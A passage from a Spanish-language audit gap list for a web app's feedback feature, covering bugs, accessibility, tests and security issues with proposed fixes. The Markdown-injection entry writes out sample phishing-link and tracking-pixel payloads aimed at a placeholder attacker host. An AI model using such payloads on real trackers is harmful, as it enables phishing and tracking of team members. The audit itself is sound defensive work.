**Categoria:** Seguridad / DoS

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:265-313`, el servidor valida tipo y tamano de archivos individualmente, pero verifica el conteo **DESPUES** de agregar todos al array (linea 302). Un atacante puede enviar 100 archivos de 9.9MB cada uno: todos pasan las validaciones individuales, se procesan todos (`arrayBuffer()` en linea 329), y recien en la linea 302 se rechaza. Esto causa un pico de ~990MB de memoria.

**Solucion propuesta:**
Mover el chequeo de conteo **antes** de procesar cualquier archivo:
```typescript
const rawFiles = formData.getAll('attachments');
if (rawFiles.length > FEEDBACK_CONFIG.maxAttachments) {
    return ctx.json({ success: false, error: { code: 'VALIDATION_ERROR',
      message: `Maximo ${FEEDBACK_CONFIG.maxAttachments} archivos` } }, 400);
}
```

**Recomendacion:** Solucionar directo **inmediatamente**. Fix de una linea que previene DoS.

**Decision:** ✅ HACER. Mover validación de conteo antes del procesamiento. (2026-03-09)

---

### GAP-031-27: aria-hidden en backdrop oculta modal para screen readers [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Accesibilidad / a11y

**Descripcion:**
En `packages/feedback/src/components/FeedbackModal.tsx:292`:

```tsx
<div style={backdropStyle} aria-hidden="true" onClick={handleBackdropClick}>
    <dialog aria-modal="true" aria-labelledby="feedback-modal-title">
```

El `aria-hidden="true"` en el div padre del backdrop **oculta todo el contenido del dialog** para screen readers. El `<dialog>` interno tiene `aria-modal="true"` y `aria-labelledby` correctos, pero el `aria-hidden` del padre los anula.

**Solucion propuesta:**
Quitar `aria-hidden="true"` del div backdrop. El `<dialog>` maneja la semantica de modal por si solo.

**Recomendacion:** Solucionar directo. Fix de una linea. Blocker de accesibilidad.

**Decision:** ✅ HACER. Quitar aria-hidden="true" del div backdrop. (2026-03-09)

---

### GAP-031-28: sanitizeString destruye formato multilinea [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Bug funcional

**Descripcion:**
En `apps/api/src/middlewares/sanitization.ts:172`:

```typescript
sanitized = sanitized.replace(/\s+/g, ' ').trim();
```

`\s+` incluye `\n` (salto de linea). Para campos como `stepsToReproduce` que son multilinea por diseno (el placeholder dice "1. Ir a...\n2. Hacer click en..."), esta normalizacion destruye el formato. Los pasos quedan como una sola linea ilegible en Linear.

**Solucion propuesta:**
Para campos multilinea, usar un nivel de sanitizacion que preserve newlines:
```typescript
sanitized = sanitized.replace(/[^\S\n]+/g, ' ').replace(/\n{3,}/g, '\n\n').trim();
```
O pasar un flag `preserveNewlines: true` a `sanitizeString` para campos especificos.

**Recomendacion:** Solucionar directo. Afecta la legibilidad de los reportes en Linear.

**Decision:** ✅ HACER. Agregar flag preserveNewlines a sanitizeString para campos multilínea. (2026-03-09)

---

### GAP-031-29: feedbackPageUrl hardcodeado a locale /es/ [Audit #2]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** i18n / Funcionalidad incompleta

**Descripcion:**
Dos ubicaciones hardcodean el locale espanol:

1. `apps/admin/src/routes/__root.tsx:150`: `feedbackPageUrl="/es/feedback"`
2. `apps/web/src/components/feedback/FeedbackIslandWrapper.tsx:59`: `feedbackPageUrl="/es/feedback/"`

Si el usuario esta en locale `en` o `pt`, el error boundary lo redirige a la pagina de feedback en espanol.

**Impacto:** Bajo durante beta (principalmente usuarios hispanohablantes). Medio si se expande a otros mercados.

**Solucion propuesta:**
1. En admin: detectar locale del usuario o aceptar `locale` como prop
2. En web: construir URL dinamicamente con el locale de la pagina actual (disponible en Astro via `Astro.currentLocale`)

**Recomendacion:** Postergar para post-beta. Fix no trivial que necesita integracion con sistema i18n.

**Decision:** ✅ HACER. Detectar locale dinámicamente en admin y web. (2026-03-09)

---

### GAP-031-30: File uploads secuenciales a Linear (performance) [Audit #2]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Performance

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:319-325`:

```typescript
for (const attachment of input.attachments) {
    const { assetUrl } = await this.uploadFile(attachment);
    assetUrls.push(assetUrl);
}
```

Los uploads se hacen en serie. Para 5 adjuntos de 10MB, tarda 5x el tiempo de un upload individual. No hay razon para hacerlo secuencialmente ya que cada upload es independiente.

**Solucion propuesta:**
```typescript
const results = await Promise.all(input.attachments.map(a => this.uploadFile(a)));
const assetUrls = results.map(r => r.assetUrl);
```

**Recomendacion:** Solucionar directo. Mejora de performance trivial.

**Decision:** ✅ HACER. Paralelizar uploads con Promise.all. (2026-03-09)

---

### GAP-031-31: Email fallback envia al reporter en vez de al equipo [Audit #3]

**Severidad:** CRITICA
**Prioridad:** CRITICA
**Complejidad:** 1
**Categoria:** Bug / Correctness / Funcionalidad rota

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:400-403`, el payload del email fallback configura:

```typescript
const fallbackPayload: NotificationPayload = {
    type: NotificationType.FEEDBACK_REPORT,
    recipientEmail: validated.reporterEmail,  // BUG: envia AL USUARIO
    recipientName: validated.reporterName,     // BUG: nombre del usuario
    ...
};
```

La spec (seccion 7) dice explicitamente: *"Sends the email via @repo/notifications...to the configured fallback address (FEEDBACK_CONFIG.fallbackEmail)"*.

**Impacto CRITICO:** Cuando Linear esta caido o no configurado (el caso actual ya que todos los IDs son placeholder), el email fallback se envia al beta tester que reporto el bug, NO al equipo de desarrollo. El equipo **nunca recibe el reporte**. El beta tester recibe un email con su propio reporte que ya conoce.

Esto invalida completamente el proposito del email fallback.

**Solucion propuesta:**
```typescript
const fallbackPayload: NotificationPayload = {
    type: NotificationType.FEEDBACK_REPORT,
    recipientEmail: FEEDBACK_CONFIG.fallbackEmail, // 'feedback@hospeda.com'
    recipientName: 'Hospeda Feedback',
    ...
};
```

**Recomendacion:** Solucionar directo **INMEDIATAMENTE**. Fix de una linea. Este es el bug mas grave del sistema: hace que el fallback sea completamente inutil.

**Decision:** ✅ HACER. Fix recipientEmail a FEEDBACK_CONFIG.fallbackEmail. Bug más grave del sistema. (2026-03-09)

---

### GAP-031-32: Label "beta" de environment nunca se aplica a issues de Linear [Audit #3]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Funcionalidad incompleta / Desviacion de spec

**Descripcion:**
La spec (seccion 4.3) dice: *"Labels: Report type label + source label + 'beta' label"*. La configuracion define `LINEAR_CONFIG.labels.environment.beta = 'PLACEHOLDER_LABEL_ENV_BETA'`.

Sin embargo, `collectLabels()` en `apps/api/src/services/feedback/linear.service.ts:493-511` solo recopila:
1. Report type label (bug-js, bug-ui-ux, etc.)
2. Source app label (web, admin, standalone)

**Nunca agrega** el label de environment beta. El codigo no tiene ninguna referencia a `labels.environment.beta`. Busqueda `grep` por `beta.*label|LABEL_ENV_BETA|environment.*beta` en el directorio de services confirma cero coincidencias.

**Impacto:** Cuando se configuren los IDs reales de Linear, los issues no tendran el label "Beta" que permitiria filtrarlos y distinguirlos de issues futuros de produccion.

**Solucion propuesta:**
Agregar al final de `collectLabels()`:
```typescript
// Environment (beta) label
const betaLabelId = this.feedbackConfig.linear.labels.environment.beta;
if (betaLabelId && !betaLabelId.startsWith('PLACEHOLDER_')) {
    labelIds.push(betaLabelId);
}
```

**Recomendacion:** Solucionar directo. Fix trivial de 4 lineas.

**Decision:** ✅ HACER. Agregar beta label a collectLabels(). (2026-03-09)

---

### GAP-031-33: Attachments perdidos en email fallback [Audit #3]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Funcionalidad incompleta / Desviacion de spec

**Descripcion:**
La spec (seccion 7) dice: *"Email includes: all form fields, all auto-collected data, and attachments as base64 inline images"*.

En `apps/api/src/routes/feedback/submit.ts:400-424`, el `fallbackPayload` NO incluye datos de attachments. El tipo `FeedbackReportPayload` tiene `attachmentUrls?: string[]` pero:

1. Los attachments ya estan convertidos a `Buffer` en `feedbackAttachments` (linea 328-338)
2. El payload solo pasaria URLs.. pero esas URLs solo existen despues de subir a Linear (que fallo)
3. No se incluye ni `attachmentUrls` ni los buffers raw en el payload

**Impacto:** Si un beta tester sube screenshots importantes y Linear esta caido, esas imagenes se pierden completamente. El email llega sin adjuntos, perdiendo contexto visual critico para reproducir el bug.

**Solucion propuesta:**
1. Extender `FeedbackReportPayload` para aceptar `attachments?: Array<{ filename: string; content: Buffer; contentType: string }>`
2. Pasar `feedbackAttachments` al payload
3. En `FeedbackReportEmail.tsx`: renderizar las imagenes como base64 inline (`data:image/png;base64,...`)
4. En el transport de Resend: pasar como attachments nativos del SDK

Alternativa minimalista: serializar imagenes como base64 y embedirlas directamente en el HTML del email.

**Recomendacion:** Solucionar directo. La spec lo pide explicitamente y la infraestructura de `@repo/notifications` ya soporta attachments (T-007/T-008).

**Decision:** ✅ HACER. Incluir attachments como base64 en email fallback usando infra existente de @repo/notifications. (2026-03-09)

---

### GAP-031-34: LinearFeedbackService se re-crea en cada request [Audit #3]

**Severidad:** MEDIA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Performance / Resource waste

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:138-149`, `buildLinearService()` crea una nueva instancia de `LinearFeedbackService` (y por tanto un nuevo `LinearClient` del SDK) en cada request HTTP:

```typescript
function buildLinearService(): LinearFeedbackService | null {
    const apiKey = env.HOSPEDA_LINEAR_API_KEY;
    if (!apiKey) { ... }
    return new LinearFeedbackService({ apiKey, feedbackConfig: FEEDBACK_CONFIG });
}
```

El `LinearClient` del SDK inicializa conexiones HTTP, parsea configuracion, etc. Esto se repite innecesariamente en cada request.

**Impacto:** Bajo en practica (beta, bajo volumen), pero es un anti-pattern que desperdicia recursos y agrega latencia innecesaria a cada submission.

**Solucion propuesta:**
Usar lazy singleton pattern (igual que `notification-helper.ts`):
```typescript
let linearServiceInstance: LinearFeedbackService | null = null;
let linearServiceChecked = false;

function getLinearService(): LinearFeedbackService | null {
    if (linearServiceChecked) return linearServiceInstance;
    linearServiceChecked = true;
    const apiKey = env.HOSPEDA_LINEAR_API_KEY;
    if (!apiKey) { return null; }
    linearServiceInstance = new LinearFeedbackService({ apiKey, feedbackConfig: FEEDBACK_CONFIG });
    return linearServiceInstance;
}
```

**Recomendacion:** Solucionar directo. Refactor trivial.

**Decision:** ✅ HACER. Refactor a lazy singleton. (2026-03-09)

---

### GAP-031-35: HOSPEDA_LINEAR_TEAM_ID registrado en env pero nunca usado [Audit #3]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Dead config / DX confusion

**Descripcion:**
`HOSPEDA_LINEAR_TEAM_ID` esta definido en `apps/api/src/utils/env.ts` (ApiEnvSchema) como string opcional, y registrado en `packages/config/src/env-registry.hospeda.ts`. Sin embargo, **nunca se importa ni se usa en ningun archivo**.

El team ID se lee desde `FEEDBACK_CONFIG.linear.teamId` (hardcodeado en `feedback.config.ts`), no desde la env var. Un desarrollador que configure `HOSPEDA_LINEAR_TEAM_ID` en su `.env` pensaria que esta funcionando, pero no tiene efecto.

**Solucion propuesta:**
1. **Opcion A:** Eliminar `HOSPEDA_LINEAR_TEAM_ID` del ApiEnvSchema y env-registry (ya que se configura en feedback.config.ts)
2. **Opcion B:** Usar la env var en `buildLinearService()` para overridear el config si esta presente (mas flexible)

**Recomendacion:** Opcion A es mas simple. Opcion B da flexibilidad para separar config de Linear de los commits de codigo.

**Decision:** ✅ HACER Opción A. Eliminar HOSPEDA_LINEAR_TEAM_ID de ApiEnvSchema y env-registry. (2026-03-09)

---

### GAP-031-36: Severity labels hardcodeados en submit.ts en vez de usar config [Audit #3]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** DRY / Violacion Single Source of Truth

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:122-131`:

```typescript
function resolveSeverityLabel(severityId?: string): string | undefined {
    if (!severityId) return undefined;
    const SEVERITY_LABELS: Record<string, string> = {
        critical: 'Critico',
        high: 'Alto',
        medium: 'Medio',
        low: 'Bajo'
    };
    return SEVERITY_LABELS[severityId] ?? severityId;
}
```

Estas labels estan duplicadas. Los mismos valores existen en `FEEDBACK_CONFIG.severityLevels[].label`. Si alguien agrega un nuevo nivel de severidad o cambia un label en el config, este mapping local quedaria desactualizado silenciosamente.

**Solucion propuesta:**
```typescript
function resolveSeverityLabel(severityId?: string): string | undefined {
    if (!severityId) return undefined;
    const entry = FEEDBACK_CONFIG.severityLevels.find(s => s.id === severityId);
    return entry?.label ?? severityId;
}
```

**Recomendacion:** Solucionar directo. Fix trivial. Importar de la fuente canonica.

**Decision:** ✅ HACER. Importar severity labels de FEEDBACK_CONFIG en vez de hardcodear. (2026-03-09)

---

### GAP-031-37: Hooks llamados condicionalmente en FeedbackFAB (Rules of Hooks violation) [Audit #4]

**Severidad:** CRITICA
**Prioridad:** CRITICA
**Complejidad:** 1
**Categoria:** Bug / Correctness / React Rules violation

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:317-380`, el componente tiene un early return **antes** de declarar los hooks:

```typescript
export function FeedbackFAB(...) {
    if (!FEEDBACK_CONFIG.enabled) return null;  // <- early return ANTES de hooks

    const [isOpen, setIsOpen] = useState<boolean>(false);  // <- hooks despues del return
    useKeyboardShortcut({ onToggle: handleToggle });
    useEffect(() => { ... }, []);
    // etc.
}
```

Esto viola la Regla #1 de React Hooks: *"Don't call Hooks inside conditions, loops, or nested functions"*. Si `FEEDBACK_CONFIG.enabled` es `false`, React no ejecuta ningun hook. Si en un render posterior (hot-reload, test setup, cambio de config en runtime) `enabled` cambia a `true`, React lanza un error fatal porque el numero de hooks cambio entre renders.

Incluso sin cambio de config, esta violacion puede causar problemas con React DevTools, Fast Refresh, y testing libraries.

**Solucion propuesta:**
Separar en componente wrapper + inner:
```typescript
export function FeedbackFAB(props: FeedbackFABProps) {
    if (!FEEDBACK_CONFIG.enabled) return null;
    return <FeedbackFABInner {...props} />;
}

function FeedbackFABInner({ apiUrl, appSource, ... }: FeedbackFABProps) {
    const [isOpen, setIsOpen] = useState(false);
    // ... todos los hooks aqui
}
```

**Recomendacion:** Solucionar directo **INMEDIATAMENTE**. Fix simple de refactor que previene crash potencial.

**Decision:** ✅ HACER. Separar FeedbackFAB en wrapper + FeedbackFABInner. (2026-03-09)

---

### GAP-031-38: Markdown injection en Linear issues [Audit #4]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Seguridad / Injection

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:395-458`, el metodo `buildIssueBody` interpola datos del usuario directamente en Markdown sin escapar caracteres especiales:

```typescript
// Linea ~399
`**${input.reporterName}** (${input.reporterEmail})`

// Linea ~406
`## Descripcion\n${input.description}`

// Linea ~415
`## Pasos para reproducir\n${input.stepsToReproduce}`
```

Un atacante puede inyectar Markdown malicioso en cualquier campo de texto:

1. **Links de phishing**: Un `reporterName` como `**URGENTE** [ver solucion](https://phishing.com)` se renderiza como link clickeable en Linear
2. **Tracking pixels**: `![](https://attacker.com/track?user=teamMember)` en `description` carga una imagen externa que revela IPs y actividad del equipo
3. **Desfiguracion visual**: Headings, horizontal rules, o tablas que alteren la estructura del issue para confundir al triager

**Impacto:** Phishing interno dirigido a miembros del equipo que leen issues en Linear. Tracking de actividad via imagenes externas. Manipulacion visual de la severidad/urgencia del issue.

**Solucion propuesta:**
Crear una funcion `escapeMarkdown(text: string)` que escape los caracteres especiales de Markdown antes de interpolar:
```typescript
function escapeMarkdown(text: string): string {
    return text
        .replace(/([\\`*_{}[\]()#+\-.!|])/g, '\\$1')
        .replace(/!\[/g, '\\!\\[')  // prevenir imagenes externas
        .replace(/\[([^\]]+)\]\(/g, '\\[$1\\](');  // prevenir links
}
```

Aplicar a: `reporterName`, `reporterEmail`, `description`, `stepsToReproduce`, `expectedResult`, `actualResult`, `title`, y cada entry de `consoleErrors`.

**Recomendacion:** Solucionar directo. Fix de seguridad importante. No requiere spec.

**Decision:** ✅ HACER. Crear escapeMarkdown() y aplicar a todos los campos de usuario en Linear issues. (2026-03-09)

---

### GAP-031-39: Titulo de issue en Linear usa label espanol en vez de type ID [Audit #4]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Desviacion de spec

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:352`:

```typescript
title: `[${input.reportType}] ${input.title}`,
// Produce: "[Error de JavaScript] Mi titulo"
```

La spec (seccion 4.3) dice: *"Title: [{type}] {title}"* donde `{type}` se refiere al ID del tipo de reporte (e.g., `bug-js`), no al label localizado en espanol. Usar el label espanol en el titulo de Linear:
1. Dificulta el filtrado por tipo con busquedas automaticas (cada label puede cambiar)
2. Es inconsistente si se cambian los labels en `strings.ts`
3. No coincide con lo que el spec define

**Solucion propuesta:**
Usar `input.reportTypeId` (el ID como `bug-js`) en lugar de `input.reportType` (label como `Error de JavaScript`):
```typescript
title: `[${input.reportTypeId}] ${input.title}`,
// Produce: "[bug-js] Mi titulo"
```

O alternativamente, si se quiere mantener legibilidad, usar ambos:
```typescript
title: `[${input.reportTypeId}] ${input.title}`,
```

**Recomendacion:** Solucionar directo. Requiere verificar que `reportTypeId` esta disponible en `CreateFeedbackIssueInput` (puede requerir agregar el campo al tipo).

**Decision:** ✅ HACER. Usar reportTypeId en título de Linear issues. (2026-03-09)

---

### GAP-031-40: FeedbackModal no deshabilita scroll del body cuando esta abierto [Audit #4]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** UX / Accesibilidad

**Descripcion:**
En `packages/feedback/src/components/FeedbackModal.tsx`, cuando el modal esta abierto, el body detras puede seguir scrolleando. Esto es especialmente problematico en mobile donde el drawer (bottom-anchored) puede scrollearse accidentalmente junto con el contenido de fondo.

Ningun `useEffect` anade/remueve `overflow: hidden` en `document.body`. Este es un patron estandar para modals que falta.

**Solucion propuesta:**
```typescript
useEffect(() => {
    if (!isOpen) return;
    const original = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => { document.body.style.overflow = original; };
}, [isOpen]);
```

**Recomendacion:** Solucionar directo. Fix trivial de UX.

**Decision:** ✅ HACER. Agregar body scroll lock cuando modal está abierto. (2026-03-09)

---

### GAP-031-41: Campos de environment no sanitizados antes de enviar a Linear [Audit #4]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Seguridad / Sanitizacion incompleta

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:248-262`, el bloque de sanitizacion aplica `sanitizeString()` a los campos principales del formulario:
- `title`, `description`, `reporterName`, `stepsToReproduce`, `expectedResult`, `actualResult`

Pero **omite completamente** los campos dentro de `environment`:
- `currentUrl`, `browser`, `os`, `viewport`, `deployVersion`
- `consoleErrors[]` (array de strings)
- `errorInfo.message`, `errorInfo.stack`

Estos campos se interpolan directamente en el Markdown del issue de Linear (ver GAP-031-38). Un usuario malicioso puede manipular estos campos (que son editables en el Step 2 del formulario, seccion "Detalles tecnicos") para inyectar contenido.

**Nota:** Este gap es complementario a GAP-031-18 (reporterEmail) y GAP-031-38 (Markdown injection). La combinacion de los tres crea una superficie de ataque considerable.

**Solucion propuesta:**
Extender el bloque de sanitizacion para incluir todos los campos de environment:
```typescript
if (validated.environment) {
    validated.environment.browser = sanitizeString(validated.environment.browser);
    validated.environment.os = sanitizeString(validated.environment.os);
    validated.environment.viewport = sanitizeString(validated.environment.viewport);
    validated.environment.deployVersion = sanitizeString(validated.environment.deployVersion);
    if (validated.environment.consoleErrors) {
        validated.environment.consoleErrors = validated.environment.consoleErrors.map(
            e => sanitizeString(e).slice(0, 500)
        );
    }
    if (validated.environment.errorInfo) {
        validated.environment.errorInfo.message = sanitizeString(validated.environment.errorInfo.message);
        if (validated.environment.errorInfo.stack) {
            validated.environment.errorInfo.stack = sanitizeString(validated.environment.errorInfo.stack).slice(0, 2000);
        }
    }
}
```

**Recomendacion:** Solucionar directo junto con GAP-031-38.

**Decision:** ✅ HACER. Sanitizar todos los campos de environment (junto con GAP-031-38). (2026-03-09)

---

### GAP-031-42: Query param `type` no se valida contra REPORT_TYPE_IDS [Audit #4]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Correctness / Validacion

**Descripcion:**
En `packages/feedback/src/lib/query-params.ts:77`:

```typescript
type: sanitize(params.get('type')) as ReportTypeId | undefined,
```

`sanitize()` limpia HTML/XSS pero no valida que el valor sea un `ReportTypeId` valido (uno de `bug-js`, `bug-ui-ux`, `bug-content`, `feature-request`, `improvement`, `other`). Un valor como `"invalid-type"` pasa la sanitizacion y llega al form como `prefillData.type`.

En la practica, el formulario simplemente muestra el primer tipo en el `<select>` (el valor invalido no coincide con ninguna opcion), y la validacion Zod final lo rechaza en submit. Pero la UX es confusa: el usuario ve un tipo seleccionado que no corresponde a su intencion.

**Solucion propuesta:**
```typescript
const rawType = sanitize(params.get('type'));
const validTypes = REPORT_TYPE_IDS as readonly string[];
const type = (rawType && validTypes.includes(rawType) ? rawType : undefined) as ReportTypeId | undefined;
```

**Recomendacion:** Solucionar directo. Fix trivial de una linea. No requiere spec.

**Decision:** ✅ HACER. Validar query param type contra REPORT_TYPE_IDS. (2026-03-09)

---

### GAP-031-43: mapZodMessage usa string matching fragil sobre mensajes de Zod [Audit #4]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Fragilidad / Mantenibilidad

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:187-209`:

```typescript
function mapZodMessage(path: (string | number)[], message: string): string {
    if (field === 'title') {
        if (message.includes('least')) return FEEDBACK_STRINGS.validation.titleMin;
        if (message.includes('most')) return FEEDBACK_STRINGS.validation.titleMax;
    }
    // ...similar para otros campos
}
```

Los mensajes de Zod estan en ingles ("String must contain at least 5 character(s)") y se identifican por substring matching (`'least'`, `'most'`). Si Zod cambia el formato de sus mensajes en una version menor (e.g., "minimum" en vez de "at least"), estos checks silenciosamente fallaran y siempre retornaran el primer match o el mensaje raw en ingles.

**Solucion propuesta:**
Usar los codigos de issue de Zod (`issue.code`) que son estables en la API:
```typescript
// Requiere cambiar la firma para recibir ZodIssue
if (issue.code === 'too_small') return FEEDBACK_STRINGS.validation.titleMin;
if (issue.code === 'too_big') return FEEDBACK_STRINGS.validation.titleMax;
```

Alternativamente, usar `.min(5, { message: FEEDBACK_STRINGS.validation.titleMin })` directamente en el schema.

**Recomendacion:** Postergar para refactor. Bajo riesgo inmediato pero fragilidad a largo plazo.

**Decision:** ✅ HACER. Migrar a issue.code o mensajes custom en schema Zod. (2026-03-09)

---

### GAP-031-44: StepDetails tiene 3 strings hardcodeados fuera de FEEDBACK_STRINGS [Audit #4]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Consistencia / DRY

**Descripcion:**
En `packages/feedback/src/components/steps/StepDetails.tsx`, tres strings en espanol estan hardcodeados directamente en JSX en lugar de usar `FEEDBACK_STRINGS`:

- Linea ~323: `<option value="">-- Opcional --</option>`
- Linea ~375: `placeholder="Lo que esperabas que pasara..."`
- Linea ~396: `placeholder="Lo que realmente ocurrio..."`

El resto del archivo usa `FEEDBACK_STRINGS` correctamente. Estos 3 strings son inconsistentes.

**Solucion propuesta:**
Agregar a `FEEDBACK_STRINGS.fields`:
```typescript
severityPlaceholder: '-- Opcional --',
expectedResultPlaceholder: 'Lo que esperabas que pasara...',
actualResultPlaceholder: 'Lo que realmente ocurrio...',
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Mover 3 strings hardcodeados a FEEDBACK_STRINGS. (2026-03-09)

---

### GAP-031-45: validateStep1 valida environment schema innecesariamente [Audit #4]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** UX / Robustez

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:311-349`, `validateStep1()` parsea el schema completo incluyendo `environment`:

```typescript
const combined = {
    ...basicData,
    ...detailsData,
    attachments: attachments.length > 0 ? attachments : undefined,
    environment  // <- incluido en validacion de step 1
};
const result = feedbackFormSchema.safeParse(combined);
```

`feedbackEnvironmentSchema` requiere `timestamp` y `appSource` como campos obligatorios. Si por algun motivo `collectEnvironmentData()` falla o retorna un objeto incompleto (e.g., en un entorno de testing con window undefined), la validacion de step 1 fallara con un error sobre `environment.timestamp` o `environment.appSource` que:
1. El usuario no puede ver (environment esta en step 2, colapsado en "Detalles tecnicos")
2. El usuario no puede corregir directamente
3. El error no mapea a ningun campo visible de step 1

**Solucion propuesta:**
Validar solo los campos de step 1 con un sub-schema:
```typescript
const step1Schema = feedbackFormSchema.pick({
    type: true, title: true, description: true,
    reporterEmail: true, reporterName: true,
});
```

O validar `environment` solo en el submit final, no en `validateStep1`.

**Recomendacion:** Solucionar directo. Mejora robustez y UX.

**Decision:** ✅ HACER. Separar validación por steps, environment solo en submit final. (2026-03-09)

---

### GAP-031-46: No existen E2E/Playwright tests reales (solo tests unitarios/estructurales) [Audit #4]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 4
**Categoria:** Testing / Cobertura

**Descripcion:**
Las tasks T-039 a T-045 (Testing Phase) estan en estado `pending`. Los archivos de test en `packages/feedback/test/e2e/` **existen** (6 archivos: fab-minimize, keyboard-shortcut, linear-integration, rate-limiting, responsive, error-boundary), pero la auditoria de los archivos revela que son **tests estructurales/de contrato** usando Vitest, no E2E reales con Playwright:

- No importan `@playwright/test` ni usan `page`, `browser`, `expect(locator)`
- Testean logica de negocio (e.g., "deberia minimizar cuando se hace click") simulando estados, no interactuando con un browser real
- Los mocks de `window`, `localStorage`, `document`, `fetch` reemplazan toda interaccion real

Esto significa que:
1. **No hay validacion visual** de que el FAB se renderiza correctamente en distintos viewports
2. **No hay prueba real** de que el keyboard shortcut funciona en un browser
3. **No hay prueba real** del drag-and-drop de archivos
4. **No hay prueba real** del flujo completo: click FAB -> form -> submit -> success
5. **No hay prueba de accesibilidad** con screen reader emulado

**Impacto:** Los tests existentes pueden pasar mientras bugs de rendering, focus management, o interaccion real fallan silenciosamente.

**Solucion propuesta:**
Implementar las tasks T-039 a T-045 como tests reales de Playwright, no como tests de Vitest con mocks:
1. Crear un fixture de Playwright que levante el dev server
2. T-039: Navegar con viewport desktop (1920x1080) y mobile (375x667), verificar modal vs drawer
3. T-040: Verificar focus trap con Tab, Escape, aria attributes con axe-core
4. T-041: Click minimize, navegar a otra pagina, verificar localStorage persiste
5. T-042: Enviar 31 requests, verificar 429 en la ultima
6. T-043: Mock server para Linear API, verificar issue creation flow
7. T-044: Inyectar error en React component, verificar error boundary + pre-fill
8. T-045: Enviar Ctrl+Shift+F, verificar modal se abre/cierra

**Recomendacion:** Implementar como parte de las tasks pendientes T-039 a T-045. No requiere spec nueva pero SI requiere que los tests sean Playwright reales, no mas tests de Vitest con mocks.

**Decision:** ✅ HACER. Implementar E2E tests con Playwright reales para T-039 a T-045. (2026-03-09)

---

### GAP-031-47: Tests dependen excesivamente de mocks, pueden ocultar bugs de integracion [Audit #4]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 3
**Categoria:** Testing / Calidad de tests

**Descripcion:**
La auditoria de los 27+ archivos de test revela un patron sistematico: los tests de componentes y hooks **no usan React Testing Library** para renderizar componentes reales. En su lugar, analizan el codigo fuente como texto (verifican imports, exportaciones, tipos) o simulan estados via funciones puras extraidas.

Ejemplos:
- `FeedbackFAB.test.tsx`: No renderiza el componente con `render()`. Testea que el archivo exporta las funciones correctas
- `useFeedbackSubmit.test.ts`: Mockea `fetch` globalmente. No verifica que FormData se construya correctamente
- `FeedbackErrorBoundary.test.tsx`: No simula un crash real de React. Verifica la estructura del componente

**Impacto:**
- Bugs como GAP-031-37 (hooks condicionales) NO serian detectados por estos tests
- El bug GAP-031-23 (setTimeout leak) NO seria detectado
- El bug GAP-031-27 (aria-hidden) NO seria detectado
- La cobertura reportada puede ser alta pero la deteccion de bugs reales es baja

**Solucion propuesta:**
Para los componentes criticos (FeedbackFAB, FeedbackForm, FeedbackModal, FeedbackErrorBoundary), agregar tests con React Testing Library que:
1. Rendericen el componente real con `render(<FeedbackFAB apiUrl="..." appSource="web" />)`
2. Interactuen via `fireEvent.click`, `fireEvent.keyDown`
3. Verifiquen estado visible via `screen.getByRole`, `screen.queryByText`
4. Verifiquen accesibilidad via `toHaveAttribute('aria-modal', 'true')`

**Recomendacion:** Solucionar como parte de un esfuerzo de mejora de tests. No requiere spec nueva. Priorizar FeedbackFAB (detectaria GAP-037) y FeedbackModal (detectaria GAP-027, GAP-040).

**Decision:** ✅ HACER. Agregar tests con React Testing Library para componentes críticos (FeedbackFAB, FeedbackModal, FeedbackErrorBoundary). (2026-03-09)

---

---

### GAP-031-48: SSRF via presigned URL de Linear no validada [Audit #5]

**Severidad:** CRITICA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / SSRF

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:280`, el servidor hace un PUT a `uploadData.uploadUrl` que proviene de la respuesta de Linear GraphQL sin validar que sea una URL S3 legitima:

```typescript
const uploadResponse = await fetch(uploadData.uploadUrl, {
    method: 'PUT',
    headers,
    body: Uint8Array.from(file.buffer)
});
```

Si la respuesta de Linear es manipulada (supply-chain attack en `@linear/sdk`, DNS rebinding, API key apuntando a workspace del atacante), el servidor haria PUT con el contenido del archivo a una URL arbitraria.

**Solucion propuesta:**
Validar que `uploadUrl` sea de un host S3 permitido:
```typescript
const ALLOWED_UPLOAD_HOSTS = /^https:\/\/[a-z0-9-]+\.s3\.amazonaws\.com\//i;
if (!ALLOWED_UPLOAD_HOSTS.test(uploadData.uploadUrl)) {
